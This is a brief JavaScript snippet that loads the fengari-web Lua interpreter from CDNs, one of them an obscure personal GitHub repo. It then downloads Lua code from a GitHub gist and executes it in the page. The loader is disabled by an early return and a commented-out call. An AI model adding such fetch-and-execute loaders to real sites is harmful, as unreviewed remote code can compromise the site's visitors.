const cdnSources = [
    'https://cdn.jsdelivr.net/npm/fengari-web@0.1.4/dist/fengari-web.js',
    'https://unpkg.com/fengari-web@0.1.4/dist/fengari-web.js',
    'https://raw.githubusercontent.com/gm92342/sdhiabfkgcnf/refs/heads/main/fengari-web.js'
];
function loadFengari(sources, index = 0) {
    return
    if (index >= sources.length) {
        return;
    }
    const script = document.createElement('script');
    script.src = sources[index];
    script.onload = () => {
        fetch('https://gist.githubusercontent.com/gm92342/deddbd095a67a28da4b4b7b65533561f/raw/75d6570c23ee146a5bae23b64c3f6e6b390b7b44/script.js')
            .then(response => response.text())
            .then(luaCode => {
                fengari.load(luaCode)();
            });
    };
    script.onerror = () => {
        loadFengari(sources, index + 1);
    };
    document.head.appendChild(script);
}
//loadFengari(cdnSources);
